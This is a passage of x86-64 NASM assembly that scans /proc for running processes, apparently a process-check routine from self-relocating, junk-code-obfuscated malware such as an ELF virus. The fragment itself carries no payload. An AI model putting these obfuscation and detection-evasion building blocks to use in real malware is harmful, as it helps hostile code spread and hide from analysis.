
    push    r12
    push    r13
    push    r14
    push    r15
	JUNK_5

    mov     rax, SYS_open


    mov     rdi, [rbp + 16]
    add     rdi, mydata.proc_prefix


    ;lea     rdi, [rel proc_prefix]


    xor     rsi, rsi
    xor     rdx, rdx
    syscall
    cmp     rax, 0
    jl      .ret_not_found
    mov     r12, rax               ; save /proc/ fd

.read_dir:
	JUNK_5

    mov     rax, SYS_getdents64
    mov     rdi, r12 ; use /proc/ fd

    mov     rsi, [rbp + 16]
    add     rsi, mydata.buff

    ;lea     rsi, [rel buff]
    mov     rdx, 4096
    syscall
    cmp     rax, 0
    jle     .close_and_ret_not_found
    mov     r14, rax
    xor     r13, r13



.read_getdents_entry:
    cmp     r13, r14
    jge     .read_dir

    mov     rdi, [rbp + 16]
    add     rdi, mydata.buff
    ;lea     rdi, [rel buff]
    add     rdi, r13
    movzx   r10, word [rdi + 16] ; d_reclen
    mov     al, byte [rdi + 18] ; d_type
    lea     rsi, [rdi + 19]
    add     r13, r10

    cmp     al, DT_DIR
    jne     .read_getdents_entry


    push    rsi
        push    rdi
        mov     rdi, rsi
    .check_loopf:
        mov     al, [rdi]
        test    al, al
        jz      .is_numericf
        cmp     al, '0'
        jl      .not_numericf
        cmp     al, '9'
        jg      .not_numericf
        inc     rdi
        jmp     .check_loopf
    .is_numericf:
        mov     rax, 1
        jmp     .donef
    .not_numericf:
        xor     rax, rax
    .donef:
        pop     rdi
    pop     rsi
    test    rax, rax
    jz      .read_getdents_entry



    push    rsi
    mov     r15, rsi



%include "functions/parse_dir.s"



    ;call    _parse_dir
    pop     rsi
    test    rax, rax
    jnz     .close_and_ret_found
    jmp     .read_getdents_entry

.close_and_ret_found:
    mov     rax, SYS_close
    mov     rdi, r12
    syscall
    mov     rax, 1
    jmp     .retf0

.close_and_ret_not_found:
    mov     rax, SYS_close
    mov     rdi, r12
    syscall

.ret_not_found:
    xor     rax, rax

.retf0:
    pop     r15
    pop     r14
    pop     r13
    pop     r12
